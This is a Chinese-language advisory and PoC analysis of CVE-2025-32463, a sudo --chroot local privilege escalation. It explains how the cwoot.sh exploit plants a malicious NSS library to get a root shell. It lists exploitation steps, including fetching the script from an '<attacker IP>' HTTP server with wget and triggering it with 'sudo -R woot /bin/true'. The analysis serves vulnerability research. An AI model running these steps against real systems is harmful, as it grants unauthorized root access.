## CVE-2025-32463 - Linux Sudo 本地权限提升 (Local Privilege Escalation, LPE)

**漏洞编号:** CVE-2025-32463

**漏洞类型:** 本地权限提升 (Local Privilege Escalation, LPE)

**影响应用:** Linux Sudo

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** 1.9.14 至 1.9.17 (在 1.9.17p1 版本中修复)

**利用条件:** 本地用户访问，可利用 sudo 的 --chroot 选项，即使非 sudoer 用户亦可能受影响。

**POC 可用性:** 10

**POC 类型:** 完整利用 (Full Exploitation)

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-32463是一个影响Linux sudo组件的高危本地权限提升漏洞。该漏洞在Sudo版本1.9.14中被引入，并影响至1.9.17版本，最终在1.9.17p1版本中得到了修复。其根源在于Sudo在使用`--chroot`（或`-R`）选项时对命令匹配处理代码的更新不当，导致对用户控制目录中的`/etc/nsswitch.conf`文件的使用存在安全缺陷。具体而言，Sudo在检查用户权限之前评估`--chroot`选项，攻击者可以利用此机制控制chroot环境，并加载恶意的动态链接库，从而获取root权限。

### POC有效性分析

提供的POC代码，即`cwoot.sh`脚本，是一个高度有效且功能完整的本地权限提升工具。该脚本自动化了整个攻击流程，包括创建必要的恶意文件和配置。它首先创建一个临时工作目录，然后在该目录内动态生成一个C语言源文件`woot1337.c`。这个C文件包含一个`__attribute__((constructor))`函数，该函数在库加载时自动执行，其核心功能是调用`setreuid(0, 0)`和`setregid(0, 0)`来将当前进程的用户和组ID设置为root（0），然后执行`/bin/bash`来获得一个root shell。接着，脚本利用`gcc`将`woot1337.c`编译成一个共享库`libnss_/woot1337.so.2`。为了利用chroot功能，它还创建了一个伪造的`chroot`根目录（`woot`），并在其中配置一个恶意的`/etc/nsswitch.conf`文件，将`passwd`服务指向`woot1337`。最后，脚本通过执行`sudo -R woot /bin/true`触发漏洞。当sudo在`woot`这个受控的chroot环境中运行时，它会加载恶意的`nsswitch.conf`并进而加载`libnss_/woot1337.so.2`，导致攻击者获得root权限。整个过程无需人工干预即可成功获取root shell，表明POC具有极高的可用性和有效性。

### 利用步骤

攻击者可以按照以下步骤利用此漏洞：
1.  **获取POC脚本**：从GitHub仓库（例如`git clone https://github.com/justjoeyking/CVE-2025-32463.git`）下载POC脚本。通常，攻击者可能会通过搭建一个HTTP服务器，让目标机器下载脚本，例如在攻击者机器上运行`python3 -m http.server 8080`，然后在目标机器上执行`wget http://<攻击者IP地址>:8080/cwoot.sh`。
2.  **赋予执行权限**：在目标机器上，为下载的`cwoot.sh`脚本赋予执行权限：`chmod 755 cwoot.sh`。
3.  **执行漏洞利用脚本**：在目标机器上运行`./cwoot.sh`。脚本将自动完成所有必要的操作：创建临时目录、生成并编译恶意动态库、设置chroot环境，并通过`sudo -R woot /bin/true`触发漏洞。
4.  **获得Root权限**：一旦漏洞被成功利用，脚本将直接提供一个具有root权限的bash shell。

### 投毒风险分析

对于提供的CVE-2025-32463的POC代码，其投毒风险评估为低（10%）。进行此评估是基于对`cwoot.sh`脚本及其内部的`woot1337.c`代码的深入分析，而非其获取和分发方式。具体分析如下：

1.  **代码清晰度与可读性**：`cwoot.sh`脚本是用Bash编写的，逻辑结构清晰，每一步操作都易于理解。它创建临时目录、生成C代码、编译、创建chroot环境并执行sudo命令。`woot1337.c`是一个简短的C程序，仅包含设置权限和执行`/bin/bash`的功能，没有复杂或难以理解的逻辑。代码中没有使用混淆技术，所有字符串和函数调用都直接可见。

2.  **标准库和系统调用**：脚本和C代码都只使用了标准的Linux命令（如`mktemp`, `cd`, `cat`, `mkdir`, `echo`, `cp`, `gcc`, `sudo`）和C标准库函数（如`stdlib.h`中的`setreuid`, `setregid`, `unistd.h`中的`chdir`, `execl`）。这些都是在开发合法程序或安全研究工具中常用的组件，没有发现任何调用非标准、已弃用或可疑的库或系统调用。

3.  **无隐藏恶意负载**：该POC的主要且唯一目的是利用CVE-2025-32463漏洞进行本地权限提升。通过对代码的审查，没有发现任何迹象表明其包含额外的、与提权无关的恶意功能。例如，代码中没有发现：
    *   **后门功能**：没有创建持久化后门、添加新的用户账户、修改系统关键文件或服务。
    *   **数据窃取**：没有尝试访问、收集或外传用户数据、系统配置、凭据信息。
    *   **加密货币挖掘**：没有下载或执行任何挖矿程序。
    *   **勒索软件行为**：没有加密文件或显示勒索信息。
    *   **僵尸网络组件**：没有尝试连接C2服务器或加入僵尸网络。
    *   **外部网络请求**：除了可能用于下载脚本本身的`wget`命令外，脚本本身在执行过程中没有进行任何额外的、未经说明的外部网络通信。

4.  **环境清理**：尽管脚本创建了临时目录和文件，但它没有明确的清理机制来删除这些痕迹。然而，这并非恶意行为，而是典型的POC或临时脚本特征，通常依赖用户或系统进行清理。

总结来说，这份POC代码是专注于利用特定Sudo漏洞的“纯粹”提权工具。其功能严格限定在漏洞利用的范畴内，没有观察到任何超出此范围的、隐蔽的恶意行为。因此，从代码本身的角度来看，投毒风险较低。然而，用户在获取任何POC代码时，仍应始终从可信来源下载，并建议在受控环境中进行代码审查和测试，以防范攻击者对POC代码进行篡改。

**项目地址:** https://github.com/justjoeyking/CVE-2025-32463.git

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-32463
